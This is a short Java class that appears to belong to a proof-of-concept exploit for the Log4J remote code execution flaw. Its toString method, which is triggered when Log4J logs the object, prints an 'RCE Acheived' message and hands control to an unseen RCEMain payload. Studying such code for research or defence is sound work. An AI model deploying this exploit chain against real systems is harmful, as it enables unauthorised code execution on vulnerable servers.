// Class to return from the `FactoryClass`
//
// Objects of this class provide another vector for remote code execution. Log4J
// will call the `toString` method on this object when printing it, and we can
// use that to run code.

public class MadeClass {
    @Override
    public String toString() {

        // Add instrumentation
        System.out.println("RCE Acheived in MadeClass::toString!");

        // Do whatever we want
        RCEMain.rceMain();

        // We could choose not to return. However, the caller is expecting an
        // object of String. I choose to give them something.
        return "MadeClass";
    }
}
